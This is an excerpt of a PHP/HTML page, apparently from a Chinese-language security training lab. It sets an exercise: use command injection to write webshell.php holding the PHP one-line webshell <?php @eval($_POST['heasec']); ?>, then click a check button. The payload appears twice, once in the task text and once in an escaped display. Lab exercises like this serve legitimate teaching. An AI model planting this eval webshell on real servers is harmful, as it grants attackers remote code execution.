    ...
    <div class="tech-card">
        ...
        <div class="tech-card-body">
            ...
            <div class="alert-warning">
                <div>
                    <strong>任务目标：</strong>
                    <small>利用命令注入漏洞在当前目录下创建 webshell.php 文件，文件内容为PHP一句话木马 &lt;?php @eval($_POST['heasec']); ?&gt;，完成后点击下方的"检测文件"按钮</small>
                </div>
            </div>
    ...
    <div class="tech-card">
        ...
        <div class="tech-card-body">
            ...
            <div class="target-string-display">
                ...
                <div class="target-value" style="font-size: 16px; letter-spacing: 0;"><?php echo htmlspecialchars("<?php @eval(\$_POST['heasec']); ?>"); ?></div>
            </div>
